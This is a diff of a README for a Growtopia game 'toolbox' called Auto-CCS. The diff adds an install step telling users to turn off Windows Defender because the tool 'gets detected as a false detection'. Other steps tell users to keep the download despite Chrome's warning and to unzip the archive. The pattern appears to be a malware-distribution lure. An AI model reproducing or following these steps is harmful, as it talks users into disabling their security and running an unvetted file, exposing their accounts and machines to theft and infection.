@@ -3,8 +3,9 @@ This is a Growtopia toolbox developed for educational purposes. I am not respons
 VT link: https://www.virustotal.com/gui/file/592bb967d78f66bd3842aee95ffe9cfc9bafb8f10e50c73bc26d2327e1be4874/detection
 
 ## How to download & install
-1. Simply follow this link: https://github.com/RealGoblinss/GT-AUTO-CCS
-2. (If necessary) Do ctrl + J (chrome) and press keep it
+1. Turn off windows defender, because Auto-CCS changes Growtopia code and gets detected as a false detection.
+2. Simply follow this link: https://github.com/RealGoblinss/GT-AUTO-CCS
+3. (If necessary) Do ctrl + J (chrome) and press keep it
 4. Unzip it with WinRar (right click -> extract to...)
 enjoy!
 
